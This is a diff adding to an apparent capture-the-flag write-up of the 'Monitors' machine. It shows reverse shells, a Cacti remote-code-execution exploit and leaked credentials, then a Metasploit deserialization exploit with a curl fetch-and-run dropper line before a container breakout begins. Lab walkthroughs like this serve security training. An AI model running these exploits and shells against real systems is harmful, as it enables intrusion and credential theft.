@@ -178,5 +178,200 @@
 
 // Found a python script for Remote Code Execution(By Leonardo paiva)
 
-// Lets download the Exploit and try him 
+// Lets download the Exploit and try him (First open listiner with nc)
+
+    $ rlwrap nc -lvnp 1445
+------
+
+    $ python3 49810_2.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.17.8 --lport 1445
+------
+
+        [+] Connecting to the server...
+        [+] Retrieving CSRF token...
+        [+] Got CSRF token: sid:c2762d0e088a56b82b0489e3372a0c2710524339,1628527257
+        [+] Trying to log in...
+        [+] Successfully logged in!
+
+        [+] SQL Injection:
+        "name","hex"
+        "",""
+        "admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
+        "sqli","43e9a4ab75570f5b"
+        [+] Check your nc listener!
+        
+// What happends Behind the sins with BurpSuite
+
+![Image 11]()
+
+// We got a shell !!
+
+        $ rlwrap nc -lvnp 1445
+        listening on [any] 1445 ...
+        connect to [10.10.17.8] from (UNKNOWN) [10.10.10.238] 51378
+        /bin/sh: 0: can't access tty; job control turned off
+        $ whoami
+        www-data
+
+
+// Get a better shell
+
+    $ SHELL=/bin/bash script -q /dev/null
+------
+
+    www-data@monitors:/usr/share/cacti/cacti$ 
+
+// After some search we found user name 'marcus'
+
+// we can search the files assosiate with this user name
+
+    www-data@monitors:$ grep 'marcus' /etc -R 2>/dev/null
+--------
+
+        ...
+        /etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
+        ...
+// We do not have parmissions in /home/marcus/.backup/ directory,
+
+// But we can try to see with 'cat' the backup,sh content
+
+    www-data@monitors:$ cat /home/marcus/.backup/backup.sh
+-----
+
+#!/bin/bash
+
+    backup_name="cacti_backup"
+    config_pass="VerticalEdge2020"
+
+    zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+    sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+    rm /tmp/${backup_name}.zip
+
+// And we have marcus password ! 'VerticalEdge2020'
+
+// We can try connect via SSH with user 'marcus'
+
+    $ ssh marcus@10.10.10.238
+---------
+
+    marcus@monitors:~$ id
+    uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
+
+// And we got user flag !
+
+    marcus@monitors:~$ cat user.txt
+    6db3c74d05...................
+
+// There is a 'note.txt' with the user flag
+
+    marcus@monitors:~$ ls
+    note.txt  user.txt
+
+    marcus@monitors:~$ cat note.txt 
+------
+
+    TODO:
+
+    Disable phpinfo	in php.ini		- DONE
+    Update docker image for production use	- 
+    marcus@monitors:~$ 
+
+
+// The note talking about docker update
+
+// So lets check listening ports
+
+    marcus@monitors:~$ netstat -tulnp
+------
+
+    (Not all processes could be identified, non-owned process info
+     will not be shown, you would have to be root to see it all.)
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+    tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
+    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+    tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+    udp        0      0 0.0.0.0:36731           0.0.0.0:*                           -                   
+    udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+    udp        0      0 127.0.0.1:161           0.0.0.0:*                           - 
+
+// 127.0.0.1:8443 , We can make SSH tunneling of this port
+
+    $ ssh -L 8443:127.0.0.1:8443 -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:8080 marcus@10.10.10.238
+
+// Navigating to https://127.0.0.1:8443
+
+![Image 10]()
+
+// We can see Tomcat version, searching for vulnerabilities ther is [one](https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialiation/) match to the version
+
+// Lets run msfconsole and try it
+
+    msf6> use exploit/linux/http/apache_ofbiz_deserialization
+-----
+
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
+    forceexploit => true
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set payload linux/x86/shell/reverse_tcp
+    payload => linux/x86/shell/reverse_tcp
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lhost 10.10.17.8
+    lhost => 10.10.17.8
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set rhosts 127.0.0.1
+    rhosts => 127.0.0.1
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lport 1444
+    lport => 1444
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
+    forceexploit => true
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set srvhost 10.10.17.8
+    srvhost => 10.10.17.8
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set srvport 1446
+    srvport => 1446
+    msf6 exploit(linux/http/apache_ofbiz_deserialization) > run
+
+    [*] Started reverse TCP handler on 10.10.17.8:1444 
+    [*] Running automatic check ("set AutoCheck false" to disable)
+    [!] The target is not exploitable. Target cannot deserialize arbitrary data. ForceExploit is enabled, proceeding with exploitation.
+    [*] Executing Linux Dropper for linux/x86/shell/reverse_tcp
+    [*] Using URL: http://10.10.17.8:1446/2U8klZ7F5Nq5La
+    [+] Successfully executed command: curl -so /tmp/uMeklgXt http://10.10.17.8:1446/2U8klZ7F5Nq5La;chmod +x /tmp/uMeklgXt;/tmp/uMeklgXt;rm -f /tmp/uMeklgXt
+    [*] Command Stager progress - 100.00% done (117/117 bytes)
+    [*] Client 10.10.10.238 (curl/7.64.0) requested /2U8klZ7F5Nq5La
+    [*] Sending payload to 10.10.10.238 (curl/7.64.0)
+    [*] Sending stage (36 bytes) to 10.10.10.238
+    [*] Command shell session 1 opened (10.10.17.8:1444 -> 10.10.10.238:60226) at 2021-08-09 17:22:10 +0000
+    [*] Server stopped.
+    
+// And we got root
+
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+
+// Promote shell 
+
+    SHELL=/bin/bash script -q /dev/null
+    
+// And we can see that we root in docker container
+
+    root@d88794475b77:#
+
+// For breake out of the container we can use the capabillities of 'cap_sys_module'
+
+// First lets check if its exist
+
+    root@d88794475b77:/root# capsh --print
+    capsh --print
+    Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+    Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+    Securebits: 00/0x0/1'b0
+     secure-noroot: no (unlocked)
+     secure-no-suid-fixup: no (unlocked)
+     secure-keep-caps: no (unlocked)
+    uid=0(root)
+    gid=0(root)
+    groups=
+
+// Its there! Following the [guide](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=11de0916be3c)
+
 
